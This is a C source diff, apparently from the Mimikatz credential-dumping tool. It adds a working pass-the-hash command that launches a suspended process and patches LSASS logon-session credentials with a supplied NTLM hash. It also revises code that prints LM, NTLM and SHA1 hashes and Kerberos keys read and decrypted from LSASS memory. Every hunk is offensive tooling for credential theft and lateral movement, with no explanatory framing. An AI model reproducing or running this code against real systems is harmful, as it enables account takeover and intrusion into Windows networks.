@@ -18,7 +18,7 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_process,	L"process",			L"Switch (or reinit) to LSASS process  context"},
 	{kuhl_m_sekurlsa_minidump,	L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
 
-	{kuhl_m_sekurlsa_msv_pth,			L"pth",		L"Pass-the-hash"},
+	{kuhl_m_sekurlsa_pth,		L"pth",				L"Pass-the-hash"},
 	{kuhl_m_sekurlsa_kerberos_tickets,	L"tickets",	L"List Kerberos tickets"},
 	{kuhl_m_sekurlsa_kerberos_keys,		L"ekeys",	L"List Kerberos Encryption Keys"},
 	{kuhl_m_sekurlsa_dpapi,				L"dpapi",	L"List Cached MasterKeys"},
@@ -420,6 +420,69 @@ NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPack
 	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
 }
 
+NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
+{
+	BYTE ntlm[LM_NTLM_HASH_LENGTH];
+	TOKEN_STATISTICS tokenStats;
+	SEKURLSA_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, ntlm, FALSE};
+	PCWCHAR szRun, szNTLM;
+	DWORD dwNeededSize;
+	HANDLE hToken;
+	PROCESS_INFORMATION processInfos;
+
+	if(kull_m_string_args_byName(argc, argv, L"user", &data.UserName, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"domain", &data.LogonDomain, NULL))
+		{
+			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
+			{
+				if(kull_m_string_stringToHex(szNTLM, ntlm, sizeof(ntlm)))
+				{
+					kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
+					kprintf(L"user\t: %s\ndomain\t: %s\nNTLM\t: ", data.UserName, data.LogonDomain);
+					kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
+					kprintf(L"Program\t: %s\n", szRun);
+					if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, data.UserName, data.LogonDomain, L"", &processInfos, FALSE))
+					{
+						kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
+						if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
+						{
+							if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
+							{
+								kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
+								kprintf(L"  \\_ msv1_0   - ");
+								kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
+								kprintf(L"\n");
+								kprintf(L"  \\_ kerberos - ");
+								kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
+								kprintf(L"\n");
+							}
+							else PRINT_ERROR_AUTO(L"GetTokenInformation");
+							CloseHandle(hToken);
+						}
+						else PRINT_ERROR_AUTO(L"OpenProcessToken");
+						
+						if(data.isReplaceOk)
+							NtResumeProcess(processInfos.hProcess);
+						else
+							NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
+						
+						CloseHandle(processInfos.hThread);
+						CloseHandle(processInfos.hProcess);
+					}
+					else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
+				}
+				else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
+			}
+			else PRINT_ERROR(L"Missing argument : ntlm\n");
+		}
+		else PRINT_ERROR(L"Missing argument : domain\n");
+	}
+	else PRINT_ERROR(L"Missing argument : user\n");
+	
+	return STATUS_SUCCESS;
+}
+
 VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PLUID luid, ULONG flags)
 {
 	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
@@ -445,16 +508,25 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 				{
 				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
 					pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) credentials->Buffer;
-
 					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
 					kuhl_m_sekurlsa_utils_NlpMakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);
 
-					kprintf(L"\n\t * Username : %wZ"
-						L"\n\t * Domain   : %wZ"
-						, &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
-					kprintf(L"\n\t * LM       : "); kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					kprintf(L"\n\t * NTLM     : "); kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					kprintf(L"\n\t * SHA1     : "); kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
+					kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
+					if(pPrimaryCreds->isLmOwfPassword)
+					{
+						kprintf(L"\n\t * LM       : ");
+						kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+					}
+					if(pPrimaryCreds->isNtOwfPassword)
+					{
+						kprintf(L"\n\t * NTLM     : ");
+						kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+					}
+					if(pPrimaryCreds->isShaOwPassword)
+					{
+						kprintf(L"\n\t * SHA1     : ");
+						kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
+					}
 					break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
 					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
@@ -484,16 +556,19 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
 		{
 			pHashPassword = (PKERB_HASHPASSWORD_GENERIC) mesCreds;
-			kprintf(L"\t %4i : ", pHashPassword->Type);
-			buffer.Buffer = (PWSTR) pHashPassword->Checksump;
-			buffer.Length = buffer.MaximumLength = (USHORT) ((pHashPassword->Size) ? pHashPassword->Size : LM_NTLM_HASH_LENGTH); // will not use CDLocateCSystem, sorry!
-			if(kull_m_string_getUnicodeString(&buffer, cLsass.hLsassMem))
+			kprintf(L"\t%s : ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
+			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
 			{
-				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
-					(*lsassLocalHelper->pLsaUnprotectMemory)(buffer.Buffer, buffer.MaximumLength);
-				kull_m_string_wprintf_hex(buffer.Buffer, buffer.Length, 0);
-				LocalFree(buffer.Buffer);
+				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
+				if(kull_m_string_getUnicodeString(&buffer, cLsass.hLsassMem))
+				{
+					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
+						(*lsassLocalHelper->pLsaUnprotectMemory)(buffer.Buffer, buffer.MaximumLength);
+					kull_m_string_wprintf_hex(buffer.Buffer, buffer.Length, 0);
+					LocalFree(buffer.Buffer);
+				}
 			}
+			else kprintf(L"<no size, buffer is incorrect>");
 			kprintf(L"\n");
 		}
 		else
